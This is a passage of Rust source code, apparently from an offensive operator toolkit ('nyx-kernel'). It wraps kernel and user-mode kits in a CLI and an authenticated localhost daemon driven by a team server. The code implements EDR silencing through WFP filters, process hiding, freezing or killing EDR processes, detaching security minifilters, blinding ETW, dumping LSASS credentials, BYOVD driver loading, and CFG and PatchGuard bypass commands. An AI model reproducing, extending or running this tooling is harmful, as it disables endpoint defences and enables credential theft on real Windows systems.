                    std::thread::sleep(std::time::Duration::from_millis(25));
                }
                Err(_) => break,
            }
        }
        child.wait().ok()?.code()
    };

    // 1. Baseline: unfiltered probe must connect (else the harness is broken).
    let baseline = run_probe(&listener, &probe, &addr) == Some(0);
    if !baseline {
        eprintln!("[!] wfp-selftest baseline connect failed — harness fault, not the kit");
        cleanup(&probe);
        json(
            false,
            false,
            false,
            0,
            "baseline connect failed",
            0,
            0,
            false,
        );
        return 2;
    }
    eprintln!("[+] wfp-selftest baseline: loopback connect OK");

    // 2. Idle probe anchors the AppId (pid → image path at install time).
    let mut idle = match Command::new(&probe)
        .arg("--wfp-probe-idle")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[!] spawn idle probe: {e}");
            cleanup(&probe);
            json(true, false, false, 0, "idle spawn failed", 0, 0, false);
            return 5;
        }
    };

    let kit = nyx_operator_kernelsdk::netsec::UserModeEdrSilencer;
    let guard = match kit.silence_edr(&[idle.id()]) {
        Ok(g) => g,
        Err(e) => {
            let _ = idle.kill();
            cleanup(&probe);
            if let Some(why) = wfp_error_is_env_limit(&e) {
                // Admin missing / BFE stopped: structured skip, NOT blocked=false
                // as a product failure. ARM64 VM (WFP works) never takes this arm.
                let note = format!("env_limit:{why}");
                eprintln!("[!] wfp-selftest env_limit skip: {note}");
                json(
                    true,
                    false,
                    false,
                    0,
                    &note,
                    WFP_SESSION_FLAG_DYNAMIC,
                    0,
                    false,
                );
                return 6;
            }
            eprintln!("[!] silence_edr failed: {e:?} (admin + BFE required)");
            json(
                true,
                false,
                false,
                0,
                "silence_edr failed",
                WFP_SESSION_FLAG_DYNAMIC,
                0,
                false,
            );
            return 5;
        }
    };
    let filters = guard.filter_count();
    let session_flags = guard.session_flags();
    let app_id_blob_len = guard.app_id_blob_lens().first().copied().unwrap_or(0);
    let image_path = guard.image_paths().first().cloned().unwrap_or_default();
    let probe_s = probe.to_string_lossy();
    let path_match = wfp_image_paths_equal(&image_path, probe_s.as_ref());
    eprintln!(
        "[+] wfp-selftest install: {filters} filter(s), ids {:?}, session_flags={session_flags:#x}, app_id_blob_len={app_id_blob_len}, path_match={path_match}",
        guard.filter_ids()
    );
    eprintln!(
        "[+] wfp-selftest AppId image: {image_path}  probe copy: {}",
        probe.display()
    );
    if filters != 1 {
        eprintln!("[!] expected exactly 1 filter, got {filters}");
        drop(guard);
        let _ = idle.kill();
        cleanup(&probe);
        json(
            true,
            false,
            false,
            filters,
            "unexpected filter count",
            session_flags,
            app_id_blob_len,
            path_match,
        );
        return 5;
    }

    // 3. Blocked phase: the probe image must now fail to connect.
    let blocked = run_probe(&listener, &probe, &addr) != Some(0);
    eprintln!("[+] wfp-selftest blocked phase: connect blocked = {blocked}");
    if !blocked {
        // Live diagnostics (2026-08-24: first hosted-runner run, Server 2025
        // x64, blocked=false while the identical kit passes on Win11 26100
        // ARM64). The guard owns a DYNAMIC session — its filters vanish the
        // moment this process exits, so a workflow post-mortem would see an
        // empty table. Dump the live filter list NOW plus AppId path equality
        // (idle image vs connecting probe copy).
        eprintln!("[!] wfp-selftest probe copy: {}", probe.display());
        eprintln!("[!] wfp-selftest idle image: {image_path}");
        eprintln!(
            "[!] wfp-selftest path_match={path_match} session_flags={session_flags:#x} app_id_blob_len={app_id_blob_len} filters={filters}"
        );
        if let Ok(out) = std::process::Command::new("netsh")
            .args(["wfp", "show", "filters", "file=-"])
            .output()
        {
            let text = String::from_utf8_lossy(&out.stdout);
            let lines: Vec<&str> = text.lines().collect();
            let needle = "nyx_wfp_probe";
            for (i, l) in lines.iter().enumerate() {
                if l.contains(needle) {
                    let lo = i.saturating_sub(12);
                    let hi = (i + 3).min(lines.len());
                    for seg in &lines[lo..hi] {
                        eprintln!("    {seg}");
                    }
                    eprintln!("    ----");
                }
            }
            if !text.contains(needle) {
                eprintln!(
                    "[!] no live filter references the probe image — install matched nothing?"
                );
            }
            if !text.contains("NyxWfpKit") {
                eprintln!("[!] no live filter named NyxWfpKit");
            }
        }
        drop(guard);
        let _ = idle.kill();
        cleanup(&probe);
        json(
            true,
            false,
            false,
            filters,
            "filter did not block probe image",
            session_flags,
            app_id_blob_len,
            path_match,
        );
        return 3;
    }

    // 4. Residue phase: drop → session close → filters gone → connect works.
    drop(guard);
    // Give BFE a beat to process the session close.
    std::thread::sleep(std::time::Duration::from_millis(500));
    let restored = run_probe(&listener, &probe, &addr) == Some(0);
    eprintln!("[+] wfp-selftest residue phase: connect restored = {restored}");

    let _ = idle.kill();
    let _ = idle.wait();
    cleanup(&probe);
    json(
        true,
        blocked,
        restored,
        filters,
        "ok",
        session_flags,
        app_id_blob_len,
        path_match,
    );
    if restored {
        eprintln!("[+] wfp-selftest PASS (baseline → blocked → restored, 1 filter, no residue)");
        0
    } else {
        eprintln!("[!] wfp-selftest FAIL: residue — connect still blocked after guard drop");
        4
    }
}

/// Shared `hide` kernel op (CLI + daemon).
#[cfg(target_os = "windows")]
fn op_hide(tier: &nyx_operator_kernelsdk::KernelTier, pid: u32) -> Result<(), String> {
    use nyx_operator_kernelsdk::ProcHideKit;
    let hide = tier
        .hide
        .as_ref()
        .ok_or_else(|| "hide kit not available".to_string())?;
    hide.hide(&*tier.rw, pid)
        .map_err(|e| format!("hide failed: {e:?}"))
}

/// Outcome of a shared `neutralize` op: `Done` for the user-mode Freeze/Choke
/// tiers, `KillKva` for the Kill tier (the resolved EPROCESS KVA — the
/// actionable artifact for a driver IOCTL / PplStripper flow).
#[cfg(target_os = "windows")]
enum NeutralizeOutcome {
    Done,
    KillKva(usize),
}

/// Shared `neutralize` kernel op (CLI + daemon). Kill resolves the target
/// EPROCESS KVA via `kill_kva`; Freeze/Choke run the user-mode tier. The CLI
/// arm previously passed Kill to `neutralize()` (which always errors without a
/// KernelRw param) — unified on the daemon's kill_kva behavior.
#[cfg(target_os = "windows")]
fn op_neutralize(
    tier: &nyx_operator_kernelsdk::KernelTier,
    pid: u32,
    method: nyx_operator_kernelsdk::NeutralizeMethod,
) -> Result<NeutralizeOutcome, String> {
    use nyx_operator_kernelsdk::EdrNeutralizeKit;
    let neu = tier
        .neutralize
        .as_ref()
        .ok_or_else(|| "neutralize kit not available".to_string())?;
    match method {
        nyx_operator_kernelsdk::NeutralizeMethod::Kill => {
            let kva = neu
                .kill_kva(&*tier.rw, pid)
                .map_err(|e| format!("kill failed: {e:?}"))?;
            Ok(NeutralizeOutcome::KillKva(kva))
        }
        freeze_or_choke => neu
            .neutralize(pid, freeze_or_choke)
            .map(|()| NeutralizeOutcome::Done)
            .map_err(|e| format!("neutralize failed: {e:?}")),
    }
}

/// Shared `detach-minifilter` kernel op (CLI + daemon).
#[cfg(target_os = "windows")]
fn op_detach_minifilter(tier: &nyx_operator_kernelsdk::KernelTier) -> Result<(), String> {
    use nyx_operator_kernelsdk::MiniFilterKit;
    let mf = tier.minifilter.as_ref().ok_or_else(|| {
        "minifilter kit not available (flt_globals_kva was 0 — supply --flt-rva)".to_string()
    })?;
    mf.detach_edr(&*tier.rw)
        .map_err(|e| format!("detach failed: {e:?}"))
}

/// Shared `window-open` sequence (CLI + daemon). Fail-closed: stop at the
/// first kit error. Neutralize uses Freeze only (existing route; never Kill).
#[cfg(target_os = "windows")]
fn op_window_open(
    tier: &nyx_operator_kernelsdk::KernelTier,
    pid: Option<u32>,
) -> Result<(), (&'static str, String)> {
    for &step in window_open_plan() {
        match step {
            "blind-etw" => op_blind_etw(tier).map_err(|e| (step, e))?,
            "neutralize" => {
                let pid = pid.ok_or((
                    step,
                    "neutralize requires pid > 0 (EDR process for freeze)".into(),
                ))?;
                op_neutralize(tier, pid, nyx_operator_kernelsdk::NeutralizeMethod::Freeze)
                    .map(|_| ())
                    .map_err(|e| (step, e))?;
            }
            "detach-minifilter" => op_detach_minifilter(tier).map_err(|e| (step, e))?,
            other => return Err((other, format!("unknown window step: {other}"))),
        }
    }
    Ok(())
}

// ---- §P3.b Daemon mode: persistent kernel session over TCP ----
//
// One bootstrap (KslD/BYOVD load + resolve_offsets pattern scan) amortised
// across many ops. JSON line protocol on localhost — the team server's
// /api/lsass handler (P3.c) connects as a client and posts ops.
//
// Auth: the daemon refuses to start without NYX_DAEMON_TOKEN. The FIRST line
// of every connection MUST be `auth <token>`; the token is compared in
// constant time, and wrong/absent tokens close the connection with an error
// line. After auth, ops are rate-limited per connection (60/min).

/// Maximum ops a single connection may dispatch per rolling 60s window.
#[cfg(target_os = "windows")]
const MAX_OPS_PER_MINUTE: usize = 60;

/// Hard cap on a single daemon line (auth line or op line). The wire protocol
/// is JSON lines with tiny payloads, so anything longer is garbage or a
/// protocol violation — the connection is closed (framing is unrecoverable
/// past the cap).
#[cfg(target_os = "windows")]
const MAX_LINE_BYTES: usize = 16 * 1024;

/// Message passed between the daemon's threads. `Conn` carries a freshly
/// accepted socket to a per-connection thread; `Op` carries one op line from a
/// connection thread back to the single dispatcher — the only thread allowed
/// to touch the `tier`, whose kit trait-objects are not `Send`.
#[cfg(target_os = "windows")]
enum DaemonMsg {
    Conn(std::net::TcpStream),
    Op(String, std::sync::mpsc::Sender<String>),
}

/// Run the kernel-tier daemon: bind a localhost TCP socket and serve one or
/// more connections concurrently. The accept loop never blocks on a client —
/// each connection is handled on its own thread (auth + op I/O), and kernel
/// ops are serialised through a single dispatcher on the daemon thread that
/// owns the live `tier`. Every connection MUST open with `auth <token>`
/// (constant-time compare against the NYX_DAEMON_TOKEN secret) within a 10s
/// auth-wait. After that, each op is a single line
/// `{"op":"...","pid":N}`; the reply is a single line JSON
/// `{"ok":true,...}` or `{"ok":false,"err":"..."}`. Ops are
/// rate-limited per connection (MAX_OPS_PER_MINUTE).
#[cfg(target_os = "windows")]
fn run_daemon(tier: nyx_operator_kernelsdk::KernelTier, build: u32, port: u16, token: String) -> ! {
    use std::net::TcpListener;
    use std::sync::mpsc;
    use std::thread;

    let bind = format!("127.0.0.1:{port}");
    let listener = match TcpListener::bind(&bind) {
        Ok(l) => {
            eprintln!("[+] nyx-kernel daemon listening on {bind} (build {build})");
            l
        }
        Err(e) => {
            eprintln!("[!] bind {bind} failed: {e}");
            std::process::exit(6);
        }
    };

    let (tx, rx) = mpsc::channel::<DaemonMsg>();

    // ---- Accept thread: keep accepting even while a client is slow/idle. ----
    let accept_tx = tx.clone();
    thread::spawn(move || {
        for stream in listener.incoming() {
            let stream = match stream {
                Ok(s) => s,
                Err(e) => {
                    eprintln!("[!] accept failed: {e}");
                    continue;
                }
            };
            if accept_tx.send(DaemonMsg::Conn(stream)).is_err() {
                // Dispatcher gone — daemon is shutting down.
                break;
            }
        }
    });

    // ---- Dispatcher (this thread): owns the tier, runs ops one at a time. ----
    // Connection threads never touch the tier (the kit trait-objects aren't
    // Send); they submit (line, reply_tx) pairs and wait for the reply.
    while let Ok(msg) = rx.recv() {
        match msg {
            DaemonMsg::Conn(stream) => {
                let peer = stream
                    .peer_addr()
                    .map(|a| a.to_string())
                    .unwrap_or_else(|_| "?".into());
                let conn_tx = tx.clone();
                let token = token.clone();
                // Per-connection thread: one slow/stuck client can no longer
                // block the accept loop or starve other connections.
                thread::spawn(move || serve_connection(stream, &peer, &token, &conn_tx));
            }
            DaemonMsg::Op(line, reply_tx) => {
                let reply = dispatch_daemon_op(&line, &tier, build);
                // A dropped receiver means the connection died mid-op; the
                // reply is simply discarded.
                let _ = reply_tx.send(reply);
            }
        }
    }
    // The channel only closes when every sender (accept thread + all
    // connection threads) has died — the daemon is broken by then.
    unreachable!("daemon channel closed (all senders dropped)");
}

/// Serve one daemon connection: token challenge (bounded by a 10s auth-wait)
/// then the per-connection op loop. Lines longer than [`MAX_LINE_BYTES`] close
/// the connection (the protocol can't frame-recover from an oversized line); a
/// bad op line is answered with `{"ok":false,...}` and the loop continues.
/// Kernel dispatch is delegated to the daemon's dispatcher thread.
#[cfg(target_os = "windows")]
fn serve_connection(
    mut stream: std::net::TcpStream,
    peer: &str,
    token: &str,
    tx: &std::sync::mpsc::Sender<DaemonMsg>,
) {
    use std::io::{BufRead, BufReader, Write};
    use std::sync::mpsc;
    use std::time::{Duration, Instant};

    // ---- Token challenge: the FIRST line must be `auth <token>`. ----
    // Bound the auth wait so a client that connects and never sends a token
    // cannot wedge a connection thread forever.
    let read_stream = match stream.try_clone() {
        Ok(s) => s,
        Err(_) => return,
    };
    if read_stream
        .set_read_timeout(Some(Duration::from_secs(10)))
        .is_err()
    {
        return;
    }
    let mut reader = BufReader::new(read_stream);
    let mut line_buf: Vec<u8> = Vec::with_capacity(256);
    let authed = match read_line_capped(&mut reader, &mut line_buf) {
        Ok(true) => check_auth(std::str::from_utf8(&line_buf).unwrap_or(""), token),
        _ => false,
    };
    if !authed {
        eprintln!("[*] daemon: {peer} auth failed — closing");
        let _ = stream.write_all(b"{\"ok\":false,\"err\":\"auth failed\"}\n");
        return;
    }
    // Auth ok — reply `{"ok":true}` per the documented wire protocol
    // (`auth <token>` → `{"ok":true}`), then lift the read timeout
    // (authenticated sessions may be long-lived — the team server holds the
    // connection between ops).
    if stream.write_all(b"{\"ok\":true}\n").is_err() {
        return;
    }
    let _ = reader.get_mut().set_read_timeout(None);
    eprintln!("[*] daemon: client {peer} authenticated");

    // ---- Per-connection op loop with rate limiting (60 ops/min). ----
    let mut op_times: Vec<Instant> = Vec::new();
    while let Ok(true) = read_line_capped(&mut reader, &mut line_buf) {
        // EOF, read error, or oversized line → close the connection.
        let line = std::str::from_utf8(&line_buf).unwrap_or("");
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let now = Instant::now();
        op_times.retain(|t| now.duration_since(*t) < Duration::from_secs(60));
        let reply = if op_times.len() >= MAX_OPS_PER_MINUTE {
            json_err("rate limit exceeded (60 ops/min per connection)")
        } else {
            op_times.push(now);
            // Hand the op to the single dispatcher (serialises kernel access)
            // and wait for the reply. A dead dispatcher = the daemon is
            // shutting down; drop the connection rather than hang it.
            let (reply_tx, reply_rx) = mpsc::channel();
            if tx
                .send(DaemonMsg::Op(trimmed.to_string(), reply_tx))
                .is_err()
            {
                break;
            }
            match reply_rx.recv() {
                Ok(r) => r,
                Err(_) => break,
            }
        };
        let reply_line = format!("{reply}\n");
        if stream.write_all(reply_line.as_bytes()).is_err() {
            break;
        }
        eprintln!("[*] daemon: {peer} → {trimmed} → {reply}");
    }
    eprintln!("[*] daemon: client {peer} disconnected");
}

/// Read one `\n`-terminated line (the `\n` included) into `out`, bounded by
/// [`MAX_LINE_BYTES`]. Returns `Ok(true)` when a line was read, `Ok(false)` on
/// clean EOF (or a read error — timeout/dead peer), and `Err` when the line
/// exceeded the cap: the peer is either hostile or broken, and since framing
/// is unrecoverable past the cap, the caller must close the connection.
#[cfg(target_os = "windows")]
fn read_line_capped<R: std::io::BufRead>(
    reader: &mut R,
    out: &mut Vec<u8>,
) -> std::io::Result<bool> {
    out.clear();
    loop {
        let avail = match reader.fill_buf() {
            Ok(a) => a,
            // Read timeout (auth wait) or a dead peer — treat as EOF; the
            // caller's auth/op loop decides what that means.
            Err(_) => return Ok(false),
        };
        if avail.is_empty() {
            return Ok(false);
        }
        match avail.iter().position(|b| *b == b'\n') {
            Some(idx) => {
                // The cap must be checked HERE too, not just in the
                // no-newline branch: a newline can arrive inside a chunk that
                // crosses the cap boundary, and the completed line would still
                // exceed the cap.
                let take = idx + 1;
                if out.len() + take > MAX_LINE_BYTES {
                    return Err(std::io::Error::new(
                        std::io::ErrorKind::InvalidData,
                        "line exceeds 16 KiB cap",
                    ));
                }
                out.extend_from_slice(&avail[..take]);
                reader.consume(take);
                return Ok(true);
            }
            None => {
                out.extend_from_slice(avail);
                let n = avail.len();
                reader.consume(n);
                if out.len() > MAX_LINE_BYTES {
                    return Err(std::io::Error::new(
                        std::io::ErrorKind::InvalidData,
                        "line exceeds 16 KiB cap",
                    ));
                }
            }
        }
    }
}

/// Dispatch one daemon op. Tiny hand-rolled JSON parser (no serde dep) — we
/// only recognise `op` (string), `pid` (number) and `method` (string, for
/// `neutralize`). Returns a JSON reply line. pid-taking ops (`dump-lsass`,
/// `hide`, `neutralize`) reject pid <= 0 or absent.
#[cfg(target_os = "windows")]
fn dispatch_daemon_op(line: &str, tier: &nyx_operator_kernelsdk::KernelTier, build: u32) -> String {
    let op = json_string_field(line, "op").unwrap_or_default();
    // Keep the raw Option so we can distinguish `"pid":0` / absent from a
    // well-formed positive pid.
    let pid_opt = json_number_field(line, "pid");

    match op.as_str() {
        "dump-lsass" => {
            let Some(pid) = pid_opt.filter(|p| *p > 0) else {
                return json_err("dump-lsass requires pid > 0");
            };
            match op_dump_lsass(tier, build, pid) {
                Ok(d) => format!(
                    r#"{{"ok":true,"out_file":"{}","bytes":{},"base_va":"0x{:x}"}}"#,
                    d.path, d.dump_len, d.base_va
                ),
                Err(e) => json_err(&e),
            }
        }
        "blind-etw" => match op_blind_etw(tier) {
            Ok(()) => json_ok(),
            Err(e) => json_err(&e),
        },
        "hide" => {
            let Some(pid) = pid_opt.filter(|p| *p > 0) else {
                return json_err("hide requires pid > 0");
            };
            match op_hide(tier, pid) {
                Ok(()) => json_ok(),
                Err(e) => json_err(&e),
            }
        }
        "detach-minifilter" => match op_detach_minifilter(tier) {
            Ok(()) => json_ok(),
            Err(e) => json_err(&e),
        },
        "neutralize" => {
            let Some(pid) = pid_opt.filter(|p| *p > 0) else {
                return json_err("neutralize requires pid > 0");
            };
            let method = json_string_field(line, "method").unwrap_or_default();
            let m = match method.as_str() {
                "freeze" => nyx_operator_kernelsdk::NeutralizeMethod::Freeze,
                "choke" => nyx_operator_kernelsdk::NeutralizeMethod::Choke,
                "kill" => nyx_operator_kernelsdk::NeutralizeMethod::Kill,
                _ => return json_err("neutralize requires method freeze|choke|kill"),
            };
            match op_neutralize(tier, pid, m) {
                Ok(NeutralizeOutcome::Done) => json_ok(),
                Ok(NeutralizeOutcome::KillKva(kva)) => format!(
                    r#"{{"ok":true,"action":"kill","eprocess_kva":"0x{kva:x}","note":"terminate via driver IOCTL or PplStripper"}}"#
                ),
                Err(e) => json_err(&e),
            }
        }
        "status" => {
            // Report which kits are live — useful for the team-server probe.
            format!(
                r#"{{"ok":true,"build":{build},"etw_ti":{},"minifilter":{},"hide":{},"cred":{}}}"#,
                tier.etw_ti.is_some(),
                tier.minifilter.is_some(),
                tier.hide.is_some(),
                tier.cred.is_some()
            )
        }
        "window-open" => {
            let pid = pid_opt.filter(|p| *p > 0);
            match op_window_open(tier, pid) {
                Ok(()) => {
                    let steps: Vec<String> = window_open_plan()
                        .iter()
                        .map(|s| format!(r#"{{"step":"{s}","ok":true}}"#))
                        .collect();
                    format!(
                        r#"{{"ok":true,"phase":"open","steps":[{}]}}"#,
                        steps.join(",")
                    )
                }
                Err((step, e)) => {
                    let escaped = e.replace('\\', "\\\\").replace('"', "\\\"");
                    format!(
                        r#"{{"ok":false,"phase":"open","failed_step":"{step}","err":"{escaped}"}}"#
                    )
                }
            }
        }
        "window-close" => window_close_reply(),
        other => json_err(&format!("unknown op: {other}")),
    }
}

/// Extract a JSON string field value `"key":"value"` → `value`. Tiny hand-rolled
/// parser — avoids a serde dependency for the daemon's JSON-line protocol.
#[cfg(target_os = "windows")]
fn json_string_field(line: &str, key: &str) -> Option<String> {
    let needle = format!("\"{key}\":\"");
    let start = line.find(&needle)? + needle.len();
    let rest = &line[start..];
    let end = rest.find('"')?;
    Some(rest[..end].to_string())
}

/// Extract a JSON number field value `"key":N` → N. Tiny hand-rolled parser.
#[cfg(target_os = "windows")]
fn json_number_field(line: &str, key: &str) -> Option<u32> {
    let needle = format!("\"{key}\":");
    let start = line.find(&needle)? + needle.len();
    let rest = line[start..].trim_start();
    let end = rest
        .find(|c: char| !c.is_ascii_digit())
        .unwrap_or(rest.len());
    rest[..end].parse().ok()
}

#[cfg(target_os = "windows")]
fn json_ok() -> String {
    r#"{"ok":true}"#.to_string()
}

#[cfg(target_os = "windows")]
fn json_err(msg: &str) -> String {
    // Escape any embedded quotes in the message.
    let escaped: String = msg.replace('\\', "\\\\").replace('"', "\\\"");
    format!(r#"{{"ok":false,"err":"{escaped}"}}"#)
}

/// Constant-time byte comparison (hand-rolled — no `subtle` dep). Never
/// short-circuits on the first differing byte; a length mismatch is folded
/// into the accumulator so timing leaks nothing about the secret's content.
#[cfg(target_os = "windows")]
fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    let mut diff = a.len() ^ b.len();
    let max = a.len().max(b.len());
    let mut i = 0;
    while i < max {
        let x = a.get(i).copied().unwrap_or(0);
        let y = b.get(i).copied().unwrap_or(0);
        diff |= (x ^ y) as usize;
        i += 1;
    }
    diff == 0
}

/// Parse and verify the first-line token challenge (`auth <token>`). The
/// token is compared in constant time; anything else (absent/malformed/wrong)
/// fails.
#[cfg(target_os = "windows")]
fn check_auth(line: &str, token: &str) -> bool {
    let line = line.trim();
    let Some(rest) = line.strip_prefix("auth ") else {
        return false;
    };
    let rest = rest.trim_start();
    !rest.is_empty() && constant_time_eq(rest.as_bytes(), token.as_bytes())
}

/// Extended usage text, including daemon mode auth requirements.
#[cfg(target_os = "windows")]
fn usage_text() -> &'static str {
    r#"usage: nyx-kernel <command> [args...]

Commands:
  bootstrap [--byovd <sys> <svc>] [--wdt <sys>] [--alsysio <sys>] [--flt-rva <hex>]
  wfp-selftest             # driverless WFP kit e2e: baseline→block→restore (admin; prints {"wfp_selftest":{...}}; exit 6 = env_limit skip)
  assess                   # real T4-T5 kernel assessment (prints {"assess":{...}} JSON line)
  blind-etw
  hide <pid>
  dump-lsass <pid>
  neutralize <pid> <freeze|choke|kill>
  detach-minifilter
  window-open [pid]        # T2 time-window: blind-etw → neutralize freeze → detach-minifilter
  window-close             # best-effort reverse; kits without undo report restored:false
  window --phase open|close [pid]
  pg-window                # PatchGuard unchecked window (holds until Ctrl+C)
  wfp-selftest             # driverless WFP kit e2e: baseline→block→restore (admin; prints {"wfp_selftest":{...}}; exit 6 = env_limit skip)
  cfg-bypass               # mark NtContinue as a valid CFG call target
  forge-etw [<parent> <child> <image> [out.bin]]
  --serve <port>           # daemon mode (see below)
  --help                   # this text

Daemon mode (--serve <port>):
  Persistent kernel session over 127.0.0.1:<port> (one bootstrap amortised
  across ops; connections served concurrently, ops serialised). The daemon
  REFUSES to start without the NYX_DAEMON_TOKEN environment variable (shared
  secret).

  Wire protocol (JSON lines; first line of EVERY connection):
    auth <token>                           -> {"ok":true} (else error + close)
    {"op":"dump-lsass","pid":684}         -> {"ok":true,"out_file":"lsass_684.dmp","bytes":N,"base_va":"0x..."}
    {"op":"blind-etw"}                    -> {"ok":true}
    {"op":"hide","pid":1234}             -> {"ok":true}
    {"op":"detach-minifilter"}            -> {"ok":true}
    {"op":"neutralize","pid":1234,"method":"freeze|choke|kill"} -> {"ok":true}
    {"op":"status"}                       -> {"ok":true,"build":N,...}
    {"op":"window-open","pid":1234}       -> {"ok":true,"phase":"open","steps":[...]} (fail-closed)
    {"op":"window-close"}                 -> {"ok":false,"phase":"close","best_effort":true,"steps":[...]}

  Wrong/absent token closes the connection with an error line. pid-taking
  ops reject pid <= 0 or absent. Ops are rate-limited per connection
  (60/min). Lines longer than 16 KiB close the connection."#
}

// ---- Helpers ----

/// T2 operator time-window kit order (open). WFP is not in the default window.
fn window_open_plan() -> &'static [&'static str] {
    &["blind-etw", "neutralize", "detach-minifilter"]
}

/// Close runs reverse order. Undo is per-kit (see [`window_undo_op`]).
fn window_close_plan() -> &'static [&'static str] {
    &["detach-minifilter", "neutralize", "blind-etw"]
}

/// Daemon restore op if kernelsdk already has undo. None of the default-window
/// kits do (MiniFilter unlink self-loops; ETW-TI has no unblind; freeze has
/// no un-freeze). Do not invent kernel writes.
fn window_undo_op(_op: &str) -> Option<&'static str> {
    None
}

/// Honest close reply: per-step `restored: false` rather than lying `ok: true`.
fn window_close_reply() -> String {
    let steps: Vec<String> = window_close_plan()
        .iter()
        .map(|op| match window_undo_op(op) {
            Some(undo) => format!(
                r#"{{"step":"{op}","restored":false,"reason":"undo op {undo} not dispatched"}}"#
            ),
            None => {
                format!(r#"{{"step":"{op}","restored":false,"reason":"no undo op"}}"#)
            }
        })
        .collect();
    format!(
        r#"{{"ok":false,"phase":"close","best_effort":true,"steps":[{}]}}"#,
        steps.join(",")
    )
}

/// Fail-closed fold of open-window step outcomes. Later items are not visited
/// after the first error.
fn fold_open_results(
    pairs: impl IntoIterator<Item = (&'static str, Result<(), String>)>,
) -> Result<Vec<&'static str>, (&'static str, String, Vec<&'static str>)> {
    let mut done = Vec::new();
    for (step, result) in pairs {
        match result {
            Ok(()) => done.push(step),
            Err(err) => return Err((step, err, done)),
        }
    }
    Ok(done)
}

/// Serialize a [`nyx_operator_kernelsdk::KernelAssessment`] as the single JSON
/// line the CI gate parses: `{"assess":{...}}`. Hand-rolled (no serde dep —
/// the daemon protocol is JSON-lines for the same reason). The exact field
/// names/types are the contract `.github/workflows/windows-byovd-hosted.yml`
/// asserts on (`"status":"Assessed"`, `total_drivers > 0`).
fn assess_json_line(a: &nyx_operator_kernelsdk::KernelAssessment) -> String {
    format!(
        r#"{{"assess":{{"status":"{:?}","total_drivers":{},"edr_drivers":{},"etw_ti_active":{},"process_callbacks":{},"image_load_callbacks":{},"registry_callbacks":{},"test_signing_enabled":{},"kernel_debugger_present":{},"hvci_enabled":{},"vbs_enabled":{}}}}}"#,
        a.status,
        a.total_drivers,
        a.edr_drivers,
        a.etw_ti_active,
        a.process_callbacks,
        a.image_load_callbacks,
        a.registry_callbacks,
        a.test_signing_enabled,
        a.kernel_debugger_present,
        a.hvci_enabled,
        a.vbs_enabled
    )
}

#[cfg(test)]
mod tests {
    use super::{
        assess_json_line, fold_open_results, window_close_plan, window_close_reply,
        window_open_plan, window_undo_op,
    };
    use nyx_operator_kernelsdk::{KernelAssessment, KernelAssessmentStatus};

    /// The CI gate parses this exact JSON: `{"assess":{...}}` with
    /// `"status":"Assessed"` and `total_drivers` a positive integer. The
    /// exact-string assertion pins the format to what
    /// `.github/workflows/windows-byovd-hosted.yml` parses.
    #[test]
    fn assess_json_line_matches_ci_gate_contract() {
        let a = KernelAssessment {
            status: KernelAssessmentStatus::Assessed,
            total_drivers: 123,
            edr_drivers: 2,
            etw_ti_active: true,
            process_callbacks: 3,
            image_load_callbacks: 1,
            registry_callbacks: 0,
            test_signing_enabled: false,
            kernel_debugger_present: false,
            hvci_enabled: true,
            vbs_enabled: true,
        };
        let line = assess_json_line(&a);
        assert_eq!(
            line,
            r#"{"assess":{"status":"Assessed","total_drivers":123,"edr_drivers":2,"etw_ti_active":true,"process_callbacks":3,"image_load_callbacks":1,"registry_callbacks":0,"test_signing_enabled":false,"kernel_debugger_present":false,"hvci_enabled":true,"vbs_enabled":true}}"#
        );
        // The CI gate's two assertions hold on this exact line.
        assert!(line.contains("\"status\":\"Assessed\""));
        assert!(line.contains("\"total_drivers\":123"));
    }

    #[test]
    fn assess_json_line_not_assessed_is_honest() {
        let a = KernelAssessment {
            status: KernelAssessmentStatus::NotAssessed,
            total_drivers: 0,
            ..KernelAssessment::default()
        };
        let line = assess_json_line(&a);
        assert!(line.contains("\"status\":\"NotAssessed\""));
        assert!(line.contains("\"total_drivers\":0"));
    }

    #[test]
    fn window_open_plan_order_excludes_wfp() {
        assert_eq!(
            window_open_plan(),
            &["blind-etw", "neutralize", "detach-minifilter"][..]
        );
        assert!(!window_open_plan().iter().any(|op| op.contains("wfp")));
        let rev: Vec<_> = window_open_plan().iter().rev().copied().collect();
        assert_eq!(window_close_plan(), rev.as_slice());
        assert!(window_open_plan()
            .iter()
            .all(|op| window_undo_op(op).is_none()));
    }

    #[test]
    fn fold_open_results_fail_closed() {
        struct FailClosedIter {
            items: Vec<(&'static str, Result<(), String>)>,
            i: usize,
            panic_at: usize,
        }
        impl Iterator for FailClosedIter {
            type Item = (&'static str, Result<(), String>);
            fn next(&mut self) -> Option<Self::Item> {
                assert!(
                    self.i < self.panic_at,
                    "fold continued past fail-closed into later kits"
                );
                let item = self.items.get(self.i).cloned();
                self.i += 1;
                item
            }
        }
        let iter = FailClosedIter {
            items: vec![
                ("blind-etw", Ok(())),
                ("neutralize", Err("boom".into())),
                ("detach-minifilter", Ok(())),
            ],
            i: 0,
            panic_at: 2,
        };
        let err = fold_open_results(iter).expect_err("second step fails closed");
        assert_eq!(err.0, "neutralize");
        assert_eq!(err.1, "boom");
        assert_eq!(err.2, vec!["blind-etw"]);
    }

    #[test]
    fn window_close_reply_is_honest() {
        let line = window_close_reply();
        assert!(line.contains("\"ok\":false"));
        assert!(line.contains("\"best_effort\":true"));
        assert!(line.contains("\"reason\":\"no undo op\""));
        assert!(line.contains("detach-minifilter"));
        assert!(!line.contains("\"ok\":true"));
    }
}

#[cfg(target_os = "windows")]
fn to_utf16(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(core::iter::once(0)).collect()
}

#[cfg(target_os = "windows")]
fn parse_flag_u32(args: &[String], flag: &str) -> Option<u32> {
    let idx = args.iter().position(|a| a == flag)?;
    args.get(idx + 1)?.trim_start_matches("0x").parse().ok()
}

#[cfg(target_os = "windows")]
fn parse_flag_string(args: &[String], flag: &str) -> Option<String> {
    let idx = args.iter().position(|a| a == flag)?;
    args.get(idx + 1).cloned()
}

#[cfg(target_os = "windows")]
fn parse_byovd(args: &[String]) -> (Option<String>, Option<String>) {
    let idx = match args.iter().position(|a| a == "--byovd") {
        Some(i) => i,
        None => return (None, None),
    };
    (args.get(idx + 1).cloned(), args.get(idx + 2).cloned())
}

/// Unload the driver held by a phys-mode bootstrap (WDT / ALSysIO). Used when
/// the post-bootstrap VA→PA selftest fails — a failed bootstrap must leave no
